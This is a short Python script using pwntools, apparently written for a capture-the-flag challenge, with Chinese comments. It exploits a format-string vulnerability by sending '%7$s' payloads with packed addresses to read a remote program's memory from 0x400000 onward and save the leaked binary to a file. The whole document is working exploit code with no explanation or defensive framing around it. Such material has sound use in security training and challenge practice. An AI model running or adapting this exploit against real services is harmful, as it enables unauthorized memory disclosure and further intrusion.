begin = 0x400000
bin_data = b''

def leak(addr):
    """
    尝试泄露指定地址的数据。
    如果成功，返回泄露的数据（不含'dump'）。
    如果失败（超时或连接关闭），返回 None。
    """
    try:
        pl = b"%7$sdump" + p64(addr)
        p.sendafter(b'Please enter your answer\n', pl)
        data = p.recvuntil(b'dump', drop=True)
        return data
    except (pwnlib.exception.PwnlibTimeoutError, EOFError):
        return None
    
try:
    while True:
        print(f"[*] Trying to leak address: 0x{begin:016x}")
        data = leak(begin)
        
        if data is None:
            # 如果 leak 返回 None，说明已经没有数据可以读取了
            print("[!] No more data received. Exiting loop.")
            break
            
        if not data:  # 如果返回空字节串 b''
            # 这通常意味着泄露的就是空数据
            bin_data += b'\x00'
            begin += 1
        else:
            bin_data += data
            begin += len(data)

except Exception as e:
    print(f"[!] An error occurred: {e}")
finally:
    print(f'[+] Dump finished. Total length: {len(bin_data)} bytes.')
    with open('dump_bin', 'wb') as f:
        f.write(bin_data)

# 尝试关闭连接
try:
    p.close()
except:
    pass
